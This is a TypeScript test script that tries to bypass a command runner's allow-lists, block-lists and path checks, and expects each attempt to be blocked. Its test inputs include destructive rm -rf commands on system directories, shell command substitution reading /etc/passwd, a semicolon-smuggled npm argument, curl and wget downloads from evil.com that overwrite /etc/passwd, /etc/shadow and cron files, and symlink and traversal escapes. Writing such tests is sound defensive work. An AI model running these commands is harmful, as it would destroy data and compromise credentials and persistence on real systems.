#!/usr/bin/env bun
// Adversarial security tests — try to break the runner.
// All cases here MUST be rejected by the system. Any case that succeeds is
// a real vulnerability.

import { checkPath } from '../src/lib/cyber/security/path';
import { checkCommand } from '../src/lib/cyber/security/command';

const roots = ['/home/z/my-project', '/tmp'];
let failures = 0;
let passes = 0;

function shouldBlock(name: string, cond: boolean) {
  if (cond) {
    console.error(`❌ FAIL (vulnerability): ${name} — was NOT blocked`);
    failures++;
  } else {
    console.log(`✓ PASS (correctly blocked): ${name}`);
    passes++;
  }
}
function shouldAllow(name: string, cond: boolean) {
  if (!cond) {
    console.error(`❌ FAIL (false rejection): ${name} — was blocked but should be allowed`);
    failures++;
  } else {
    console.log(`✓ PASS (correctly allowed): ${name}`);
    passes++;
  }
}

console.log('=== Block-list bypass attempts ===\n');

// 1. rm -rf /etc — should be blocked but currently may NOT be (regex only matches /+whitespace)
const r1 = checkCommand('rm', ['-rf', '/etc']);
shouldBlock('rm -rf /etc (path under /)', !r1.ok ? false : true);
// ^ If r1.ok is true, this is a vulnerability (we'll show the actual result below)
console.log(`    actual: ok=${r1.ok} reason=${r1.reason}`);

// 2. rm -rf /etc/passwd
const r2 = checkCommand('rm', ['-rf', '/etc/passwd']);
shouldBlock('rm -rf /etc/passwd', !r2.ok ? false : true);
console.log(`    actual: ok=${r2.ok} reason=${r2.reason}`);

// 3. rm -rf /home
const r3 = checkCommand('rm', ['-rf', '/home']);
shouldBlock('rm -rf /home', !r3.ok ? false : true);
console.log(`    actual: ok=${r3.ok} reason=${r3.reason}`);

// 4. rm -rf /var/log
const r4 = checkCommand('rm', ['-rf', '/var/log']);
shouldBlock('rm -rf /var/log', !r4.ok ? false : true);
console.log(`    actual: ok=${r4.ok} reason=${r4.reason}`);

// 5. rm -rf ~ (should be blocked — covered by current regex)
const r5 = checkCommand('rm', ['-rf', '~']);
shouldBlock('rm -rf ~', !r5.ok ? false : true);

// 6. But wait — rm isn't in the allow-list. Let me check:
const r6 = checkCommand('rm', ['-rf', '/etc']);
console.log(`    rm in allow-list? ${r6.ok === true ? 'YES (BYPASS)' : 'NO — allow-list blocks rm'}`);
console.log(`    reason: ${r6.reason}`);

console.log('\n=== Allow-list bypass attempts ===\n');

// 7. /home/z/my-project/evil/node — basename "node" is allowed, but path is outside
// trusted locations. RB-011 fix: this should now be BLOCKED.
const r7 = checkCommand('/home/z/my-project/evil/node', ['app.js']);
shouldBlock('Absolute path to node binary outside trusted location (RB-011 fix)', !r7.ok ? false : true);
console.log(`    actual: ok=${r7.ok} reason=${r7.reason}`);

// 8. ./node — relative path, resolves to current dir which is not trusted.
// RB-011 fix: this should now be BLOCKED.
const r8 = checkCommand('./node', ['app.js']);
shouldBlock('./node relative path outside trusted location (RB-011 fix)', !r8.ok ? false : true);
console.log(`    actual: ok=${r8.ok} reason=${r8.reason}`);

// 9. bash without allowShell — should be blocked
const r9 = checkCommand('bash', ['-c', 'echo hello']);
shouldBlock('bash -c without allowShell', !r9.ok ? false : true);

// 10. bash with allowShell and destructive command
const r10 = checkCommand('bash', ['-c', 'rm -rf /etc'], { allowShell: true });
shouldBlock('bash -c "rm -rf /etc" with allowShell', !r10.ok ? false : true);

// 11. bash with allowShell and subtle injection
const r11 = checkCommand('bash', ['-c', 'echo $(cat /etc/passwd)'], { allowShell: true });
shouldBlock('bash -c "echo $(cat /etc/passwd)" — command substitution', !r11.ok ? false : true);
console.log(`    actual: ok=${r11.ok} reason=${r11.reason}`);

// 12. bash with backtick injection
const r12 = checkCommand('bash', ['-c', 'echo `whoami`'], { allowShell: true });
shouldBlock('bash -c "echo `whoami`" — backtick substitution', !r12.ok ? false : true);
console.log(`    actual: ok=${r12.ok} reason=${r12.reason}`);

// 13. npm with semicolon in arg — current argv approach should be safe
const r13 = checkCommand('npm', ['install', 'lodash;rm', '-rf', '/etc']);
// This passes the block-list (no "rm -rf /" pattern) but the spawn would
// pass 'lodash;rm' as one argv element to npm, which would just fail to
// resolve the package. So it's not actually a vulnerability.
console.log(`    npm install with semicolon in arg: ok=${r13.ok} reason=${r13.reason}`);

// 14. curl with --output to /etc/passwd
const r14 = checkCommand('curl', ['-o', '/etc/passwd', 'http://evil.com']);
shouldBlock('curl -o /etc/passwd', !r14.ok ? false : true);
console.log(`    actual: ok=${r14.ok} reason=${r14.reason}`);

// 15. curl with --output to /etc/shadow
const r15 = checkCommand('curl', ['-o', '/etc/shadow', 'http://evil.com']);
shouldBlock('curl -o /etc/shadow', !r15.ok ? false : true);
console.log(`    actual: ok=${r15.ok} reason=${r15.reason}`);

// 16. wget with --output-document to /etc/cron.d
const r16 = checkCommand('wget', ['-O', '/etc/cron.d/evil', 'http://evil.com']);
shouldBlock('wget -O /etc/cron.d/evil', !r16.ok ? false : true);
console.log(`    actual: ok=${r16.ok} reason=${r16.reason}`);

console.log('\n=== Path traversal attempts ===\n');

// 17. Symlink escape — create a symlink in /tmp that points outside roots
import * as fs from 'node:fs';
const symPath = '/tmp/escape-symlink-test';
try { fs.unlinkSync(symPath); } catch {}
try {
  fs.symlinkSync('/etc', symPath);
  const r17 = checkPath(symPath, { roots });
  shouldBlock('Symlink to /etc (outside roots)', !r17.ok ? false : true);
  console.log(`    actual: ok=${r17.ok} reason=${r17.reason} real=${r17.real}`);
} catch (e) { console.log(`    symlink test setup failed: ${e}`); }
finally { try { fs.unlinkSync(symPath); } catch {} }

// 18. Symlink inside roots to a file outside roots
const symPath2 = '/tmp/escape-symlink-test2';
try { fs.unlinkSync(symPath2); } catch {}
try {
  fs.symlinkSync('/etc/passwd', symPath2);
  const r18 = checkPath(symPath2, { roots });
  shouldBlock('Symlink to /etc/passwd (outside roots)', !r18.ok ? false : true);
  console.log(`    actual: ok=${r18.ok} reason=${r18.reason} real=${r18.real}`);
} catch (e) { console.log(`    symlink test setup failed: ${e}`); }
finally { try { fs.unlinkSync(symPath2); } catch {} }

// 19. Path with .. that resolves inside root
const r19 = checkPath('/tmp/../tmp', { roots });
shouldBlock('Path /tmp/../tmp (contains ..)', !r19.ok ? false : true);
console.log(`    actual: ok=${r19.ok} reason=${r19.reason}`);

// 20. Unicode path normalization tricks — using ../
const r20 = checkPath('/tmp/..%2f..%2fetc', { roots });
shouldBlock('Path with URL-encoded .. (%2f)', !r20.ok ? false : true);
console.log(`    actual: ok=${r20.ok} reason=${r20.reason} canonical=${r20.canonical}`);

// 21. Null byte in path
const r21 = checkPath('/tmp/evil\0/etc', { roots });
shouldBlock('Path with null byte', !r21.ok ? false : true);
console.log(`    actual: ok=${r21.ok} reason=${r21.reason}`);

console.log('\n=== Summary ===');
console.log(`Passes: ${passes}`);
console.log(`Failures (vulnerabilities): ${failures}`);
if (failures > 0) {
  console.log('\n⚠️  VULNERABILITIES DETECTED — see failures above.');
  process.exit(1);
}
